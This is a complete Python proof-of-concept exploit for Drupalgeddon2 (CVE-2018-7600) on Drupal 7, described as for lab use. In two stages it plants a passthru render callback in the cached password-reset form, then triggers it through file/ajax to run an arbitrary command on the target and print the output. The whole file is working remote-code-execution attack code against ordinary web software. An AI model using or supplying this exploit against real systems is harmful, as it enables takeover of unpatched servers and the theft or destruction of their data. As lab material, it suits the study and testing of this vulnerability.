#!/usr/bin/env python3
"""Drupalgeddon2 (CVE-2018-7600) PoC for Drupal 7. Own lab use only (DC-1)."""
import argparse, re, sys
import requests

def exploit(target, cmd):
    s = requests.Session()

    # Stage 1: plant #post_render/#markup in the cached user_pass form
    params = {
        "q": "user/password",
        "name[#post_render][]": "passthru",
        "name[#type]": "markup",
        "name[#markup]": cmd,
    }
    data = {
        "form_id": "user_pass",
        "_triggering_element_name": "name",
        "_triggering_element_value": "",
        "opz": "E-mail new Password",
    }
    r1 = s.post(target, params=params, data=data, timeout=10)
    m = re.search(r'name="form_build_id" value="([^"]+)"', r1.text)
    if not m:
        sys.exit("[-] No form_build_id returned. Target may be patched (>= 7.58).")
    fbid = m.group(1)
    print(f"[+] Stage 1: payload cached, form_build_id = {fbid}")

    # Stage 2: file/ajax re-renders the poisoned 'name' element -> passthru(cmd)
    r2 = s.post(target, params={"q": f"file/ajax/name/#value/{fbid}"},
                data={"form_build_id": fbid}, timeout=10)
    print("[+] Stage 2: command output:\n")
    print(r2.text.split('[{"command"')[0].strip())

if __name__ == "__main__":
    ap = argparse.ArgumentParser(description="Drupalgeddon2 D7 PoC (lab only)")
    ap.add_argument("target", help="e.g. http://10.0.2.4/")
    ap.add_argument("cmd", help="command to run, e.g. id")
    a = ap.parse_args()
    exploit(a.target, a.cmd)
